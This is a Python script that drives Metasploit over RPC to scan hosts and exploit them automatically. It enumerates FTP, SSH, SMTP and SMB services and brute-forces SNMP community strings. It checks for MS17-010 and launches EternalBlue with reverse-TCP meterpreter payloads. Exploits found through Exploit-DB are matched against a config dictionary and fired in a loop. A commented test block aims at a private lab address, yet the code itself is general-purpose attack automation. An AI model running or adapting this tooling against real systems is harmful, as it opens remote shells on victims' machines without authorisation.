from metasploit_script import *
from json_data_processing_script import *
from web_query_and_process_script import *

import pdb
import socket
import time

####################################DICTONNARY OF EXPLOIT CONFIG FOR AUTOMATISATION#####################################

dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
    'RHOSTS': '',
    'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
    'Payload': 'windows/x64/meterpreter/reverse_tcp',
    'LHOST': ''
},
    'windows/smb/ms17_010_eternalblue_win8': {
        'RHOSTS': '',
        'Payload': 'windows/x64/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/misc/java_jmx_server': {
        'RHOSTS': '',
        'RPORT': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/smb/ms17_010_psexec': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/misc/java_rmi_server': {
        'RHOSTS': '',
        'CheckModule': 'auxiliary/scanner/misc/java_rmi_server',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_connectionid_write': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_apps_mngr': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/misc/manageengine_eventlog_analyzer_rce': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/http/phpmyadmin_null_termination_exec': {
        'RHOSTS': '',
        'Payload': 'php/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'multi/http/manageengine_sd_uploader': {
        'RHOSTS': '',
        'Payload': 'java/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/ftp/vermillion_ftpd_port': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    },
    'windows/http/manageengine_appmanager_exec': {
        'RHOSTS': '',
        'Payload': 'windows/meterpreter/reverse_tcp',
        'LHOST': ''
    }

}


#####################################################AUTO SCAN PART#####################################################
def script_automate_scan():
    '''

    @return: list data from the metasploit console, the rpc client and the console associated to this client
    '''
    # dictionnary of data
    dict_of_data = {}
    dict_tmp = {}

    # check ip_port vulnerability
    dict_port_ip_vuln = look_for_port()

    # launch metasploit
    client, console = main_connection()

    if client == -1:
        return -1

    # pdb.set_trace()
    #######################################CHECK OPENED PORT####################################
    for ip, liste_port_vuln in dict_port_ip_vuln.items():
        ###################################LOOK FOR DATA GET##################################
        #######CHECK PORT 21########
        if '21' in liste_port_vuln:
            ###############################LOOK VERSION FTP###################################
            console.write('use auxiliary/scanner/ftp/ftp_version')
            console.write('set RHOSTS ' + str(ip))
            console.write('run')
            while console.is_busy() == True:
                time.sleep(1)
            #############GET THE VERSION#############
            data_version = console.read()
            # pdb.set_trace()
            if 'FTP Banner' in data_version['data']:
                spliter = data_version['data'].split('\n')
                for line in spliter:
                    if 'FTP Banner' in line:
                        version = line
                        # pdb.set_trace()
                        dict_tmp['version ftp'] = version
            # pdb.set_trace()
            ################################LOOK FOR ANONYMOUS LOGIN#########################
            console.write('use auxiliary/scanner/ftp/anonymous')
            console.write('set RHOSTS ' + str(ip))
            console.write('run')
            while console.is_busy() == True:
                time.sleep(1)
            ##############ANONYMOUS CAPABILITY CHECK##########
            data_anonymous = console.read()
            if 'Anonymous READ' in data_anonymous['data']:
                console.write('ftp ' + str(ip))
                console.write('user anonymous')
                time.sleep(1)
                data_anonymous = console.read()
                if 'Login successful' in data_anonymous['data']:
                    dict_tmp['anonymous connexion capability'] = 'true'
                else:
                    dict_tmp['anonymous connexion capability'] = 'false'
            else:
                dict_tmp['anonymous connexion capability'] = 'false'

        #################################STORE FTP CHECK################################################################
        dict_of_data['21'] = dict_tmp
        #############RESET TMP DICT##########
        dict_tmp = {}
        # pdb.set_trace()
        ##########CHECK PORT 22#########
        if '22' in liste_port_vuln:
            ###############################LOOK VERSION SSH###################################
            console.write('use auxiliary/scanner/ssh/ssh_version')
            console.write('set RHOSTS ' + str(ip))
            console.write('run')
            time.sleep(1)
            #####################GET THE VERSION################
            data_version = console.read()
            if 'version' in data_version['data']:
                spliter = data_version['data'].split('\n')
                for line in spliter:
                    if 'version' in line:
                        version = line
                        dict_tmp['version ssh'] = version
            else:
                dict_tmp['version smtp'] = 'None'

            dict_tmp[
                'infos'] = 'mind if the version is lower than 7.7, you can try to enumerate the user with a user_file.txt'

        #################################STORE SSH CHECK################################################################
        dict_of_data['22'] = dict_tmp
        #############RESET TMP DICT##########
        dict_tmp = {}

        ########CHECK PORT 25###########
        if '25' in liste_port_vuln:
            ###############################LOOK VERSION SMTP###################################
            console.write('auxiliary/scanner/smtp/smtp_version')
            console.write('set RHOSTS ' + str(ip))
            console.write('run')
            while console.is_busy() == True:
                time.sleep(1)
            #####################GET THE VERSION################
            data_version = console.read()
            if 'version' in data_version['data']:
                spliter = data_version['data'].split('\n')
                for line in spliter:
                    if 'version' in line:
                        version = line
                        dict_tmp['version smtp'] = version
            else:
                dict_tmp['version smtp'] = 'None'

            dict_tmp[
                'infos'] = 'mind you can try to enumerate the user with a user_file.txt or even try to brute force the service'

        #################################STORE SMTP CHECK################################################################
        dict_of_data['25'] = dict_tmp
        #############RESET TMP DICT##########
        dict_tmp = {}

        ########CHECK PORT 161########### issue with this one (why only this module : I don't know)/  console.is_busy == false but result not yet display in the console !!! => error !!!!!!!!!
        # pdb.set_trace() ############### this check sucks, we are forced to slow down the process
        console.write('use auxiliary/scanner/snmp/snmp_login')
        console.write('set RHOSTS ' + str(ip))
        time.sleep(1)
        console.write('set THREADS 255')
        time.sleep(1)
        console.write('run')
        time.sleep(1)
        while console.is_busy() == True:
            time.sleep(1)
        #####################GET THE VERSION################

        data_version = console.read()
        print(data_version)
        id = 0
        if 'Successful' in data_version['data']:
            # pdb.set_trace()
            spliter = data_version['data'].split('\n')
            for line in spliter:
                if 'Successful' in line:
                    version = line
                    dict_tmp[str(id)] = version
                    id += 1
            ########################################LOOK FOR ENUMERATION#################################
            console.write('use auxiliary/scanner/snmp/snmp_enum')######### issue with this one (why only this module : I don't know)/  console.is_busy == false but result not yet display in the console !!! => error !!!!!!!!!
            # pdb.set_trace()                                    ######### this check sucks, we are forced to slow down the process
            if 'private' in data_version['data']:
                console.write('set COMMUNITY private')
            else:
                console.write('set COMMUNITY public')
            time.sleep(1)
            console.write('set RHOSTS ' + str(ip))
            time.sleep(1)
            console.write('set THREADS ' + str(255))
            time.sleep(1)
            console.write('run')
            time.sleep(1)
            while console.is_busy() == True:
                time.sleep(3)
            ###############ENUMERATION RECUP################
            data_version = console.read()
            # pdb.set_trace()
            dict_tmp['data'] = data_version['data']

        else:
            dict_tmp['data'] = 'None'

        #################################STORE SNMP CHECK################################################################
        dict_of_data['161'] = dict_tmp
        #############RESET TMP DICT##########
        dict_tmp = {}

        ########CHECK PORT 445###########
        if '445' in liste_port_vuln:
            console.write('use scanner/smb/smb_version')
            console.write('set RHOSTS ' + str(ip))
            console.write('run')
            time.sleep(1)
            #####################GET THE VERSION################
            data_version = console.read()
            if 'running' in data_version['data']:
                spliter = data_version['data'].split('\n')
                for line in spliter:
                    if 'running' in line:
                        version = line
                        dict_tmp['version smtp'] = version
            dict_tmp[
                'infos'] = 'mind you can try to enumerate the user with a user_file.txt or even try to brute force the service ; also, if the systeme is linux, try exploit/linux/samba/is_known_pipename'

            #####################CHECK MS17 VULN#################
            auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
            exploit_name = 'windows/smb/ms17_010_eternalblue'
            ######################################AUXILIARY SCAN####################################
            data_read_out = []
            data_console = main_enter_console_for_scan(auxiliary_scan, ip, console)
            # pdb.set_trace()
            if data_console != -1:
                if 'Host is likely VULNERABLE to MS17-010!' in data_console['data']:
                    data_read_out.append(
                        'ip : ' + str(ip) + ' ; ' + ' Host is likely VULNERABLE to : ' + exploit_name)
                elif 'OptionValidateError' in data_console['data']:
                    data_read_out.append(
                        'ip : ' + str(ip) + ' ; ' + ' OptionValidateError : Auxiliary failed : ' + exploit_name)
                dict_tmp['ms17'] = data_read_out
            else:
                dict_tmp['ms17'] = 'None'

        ########CHECK PORT


        dict_of_data['445'] = dict_tmp
        return dict_of_data
    return -1


###############################################AUTO RUN EXPLOIT PART####################################################
def script_automate_exploit(data_read_out, client, console):
    '''

    @param data_read_out: list data from the metasploit console
    @param client: client rpc
    @param console: console associated to the client rpc
    @return: rpc client with the created sessions for this client
    '''
    # check opened port
    opened_vuln_port, ip_vuln = look_for_port()
    ip_vuln_reconf = []

    # test with putting an unexploitable

    ####################################GET IP HOSTNAME#########################################
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    hostname = s.getsockname()[0]
    s.close()

    # extract ip from data_read_outh which is a list of string which mentions possible vulnerable ip
    for data in data_read_out:
        for ip in ip_vuln:
            if ip[0] in data and ip[0] not in ip_vuln_reconf:
                ip_vuln_reconf.append(ip[0])

    for str_data in data_read_out:
        if 'eternalblue' in str_data:
            #######################################CONFIG EXPLOIT####################################
            auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
            exploit_name = 'windows/smb/ms17_010_eternalblue'

            #####################################GET EXPLOIT########################################

            exploit = main_run_exploit(exploit_name, client)

            #######################################CONFIG OPTIONS AND PAYLOAD#######################

            running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)

            payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
            main_config_payload('LHOST', hostname, 'STR', payload)

            for ip in ip_vuln_reconf:
                main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
                main_exe_exploit(payload, exploit, client)

            print(client.sessions.list)
            sessions_created = client.sessions.list
            return client, sessions_created

    return client, -1


###############################################EXPLOIT-DB SEARCH########################################################

def get_board_exploit(client):
    # pdb.set_trace()
    board_of_exploit = {}
    tmp = {}
    list_of_ip = look_for_ip_of_nmap_scan()
    for ip in list_of_ip:
        data = get_port_id_and_name(ip)  # json script
        print(data, '\n')
        data2 = create_requete_for_exploitdb(data)  # json script
        print(data2, '\n')
        data3 = improve_research(data2)  # json script
        print(data3, '\n')
        for port, query in data3.items():
            table = exploitdb_query(query)  # query script
            output_rows = retrieve_from_html_exploitdb(table)  # query script
            exploit = retrieve_exploit_from_db_info(output_rows, client)  # metasploit_script
            if exploit != -1:
                tmp[port] = exploit
        board_of_exploit[str(ip)] = tmp
    return board_of_exploit


def brute_force_exploit(board_of_exploit, client):
    # !!!!!!!!!!!!!!!!!!!!!!GLOBAL DICTIONNARY CHECK AT THE TOP OF THE CODE !!!!!!!!!!!!!!!!!!!!!!!!#
    ####global variable####
    global session_key_client

    ###########VARIABLES FOR THIS DEFINITION##############
    session_key_client = None

    ####################################GET IP HOSTNAME#########################################
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    hostname = s.getsockname()[0]
    s.close()

    for ip in [*board_of_exploit]:
        for port, list_of_exploit in board_of_exploit[ip].items():
            for exploit in list_of_exploit:
                if exploit in [*dictionnary_config_exploit]:
                    dico_config = dictionnary_config_exploit[exploit]
                    #############################################CONFIG EXPLOIT###################################
                    exploit_running = main_run_exploit(exploit, client)
                    payload = None
                    for arg, value in dico_config.items():
                        if arg == 'RHOSTS':
                            main_change_option_exploit(arg, ip, 'STR', exploit_running)
                        if arg == 'CheckModule':
                            main_change_option_exploit(arg, dico_config[arg], 'STR', exploit_running)
                        if arg == 'RPORT':
                            main_change_option_exploit(arg, port, 'STR', exploit_running)
                        if arg == 'Payload':
                            payload = main_choose_payload(dico_config[arg], client)
                        if arg == 'LHOST' and payload is not None:
                            main_config_payload(arg, hostname, 'STR', payload)
                        # print(exploit_running.runoptions)
                    ############################################RUN EXPLOIT######################################
                    # pdb.set_trace()
                    if payload is not None:
                        json_exploit, session = main_exe_exploit(payload, exploit_running, client)

    return client.sessions.list


########################################################TEST PART#######################################################
# client, console = main_connection()
# board = {
#    "172.16.1.2":{
#       "445":[
#          "windows/smb/ms17_010_eternalblue",
#          "windows/smb/ms17_010_eternalblue_win8",
#          "windows/smb/ms17_010_psexec"
#       ],
#       "1617":[
#          "linux/http/cve_2019_1663_cisco_rmi_rce",
#          "linux/http/nuuo_nvrmini_auth_rce",
#          "linux/http/nuuo_nvrmini_unauth_rce",
#          "multi/browser/java_rmi_connection_impl",
#          "multi/http/nuuo_nvrmini_upgrade_rce",
#          "multi/http/phpmyadmin_null_termination_exec",
#          "multi/misc/java_rmi_server",
#          "unix/webapp/coppermine_piceditor",
#          "windows/ftp/vermillion_ftpd_port",
#          "windows/local/service_permissions",
#          "multi/browser/java_jre17_jmxbean",
#          "multi/browser/java_jre17_jmxbean_2",
#          "multi/misc/java_jmx_server"
#       ],
#       "8022":[
#          "multi/browser/java_jre17_jmxbean",
#          "multi/browser/java_jre17_jmxbean_2",
#          "multi/misc/java_jmx_server",
#          "linux/http/cve_2019_1663_cisco_rmi_rce",
#          "linux/http/nuuo_nvrmini_auth_rce",
#          "linux/http/nuuo_nvrmini_unauth_rce",
#          "multi/browser/java_rmi_connection_impl",
#          "multi/http/nuuo_nvrmini_upgrade_rce",
#          "multi/http/phpmyadmin_null_termination_exec",
#          "multi/misc/java_rmi_server",
#          "unix/webapp/coppermine_piceditor",
#          "windows/ftp/vermillion_ftpd_port",
#          "windows/local/service_permissions"
#       ],
#       "8032":[
#          "multi/http/manageengine_auth_upload",
#          "multi/http/manageengine_sd_uploader",
#          "multi/http/manageengine_search_sqli",
#          "windows/http/manageengine_adshacluster_rce",
#          "windows/http/manageengine_appmanager_exec",
#          "windows/http/manageengine_apps_mngr",
#          "windows/http/manageengine_connectionid_write",
#          "windows/misc/manageengine_eventlog_analyzer_rce"
#       ],
#       "8282":[
#          "multi/browser/java_jre17_jmxbean",
#          "multi/browser/java_jre17_jmxbean_2",
#          "multi/misc/java_jmx_server",
#          "linux/http/cve_2019_1663_cisco_rmi_rce",
#          "linux/http/nuuo_nvrmini_auth_rce",
#          "linux/http/nuuo_nvrmini_unauth_rce",
#          "multi/browser/java_rmi_connection_impl",
#          "multi/http/nuuo_nvrmini_upgrade_rce",
#          "multi/http/phpmyadmin_null_termination_exec",
#          "multi/misc/java_rmi_server",
#          "unix/webapp/coppermine_piceditor",
#          "windows/ftp/vermillion_ftpd_port",
#          "windows/local/service_permissions"
#       ],
#       "8444":[
#          "multi/http/manageengine_auth_upload",
#          "multi/http/manageengine_sd_uploader",
#          "multi/http/manageengine_search_sqli",
#          "windows/http/manageengine_adshacluster_rce",
#          "windows/http/manageengine_appmanager_exec",
#          "windows/http/manageengine_apps_mngr",
#          "windows/http/manageengine_connectionid_write",
#          "windows/misc/manageengine_eventlog_analyzer_rce"
#       ],
#       "49182":[
#          "linux/http/cve_2019_1663_cisco_rmi_rce",
#          "linux/http/nuuo_nvrmini_auth_rce",
#          "linux/http/nuuo_nvrmini_unauth_rce",
#          "multi/browser/java_rmi_connection_impl",
#          "multi/http/nuuo_nvrmini_upgrade_rce",
#          "multi/http/phpmyadmin_null_termination_exec",
#          "multi/misc/java_rmi_server",
#          "unix/webapp/coppermine_piceditor",
#          "windows/ftp/vermillion_ftpd_port",
#          "windows/local/service_permissions",
#          "multi/browser/java_jre17_jmxbean",
#          "multi/browser/java_jre17_jmxbean_2",
#          "multi/misc/java_jmx_server"
#       ]
#    }
# }
# print(brute_force_exploit(board, client))
#

print(script_automate_scan())
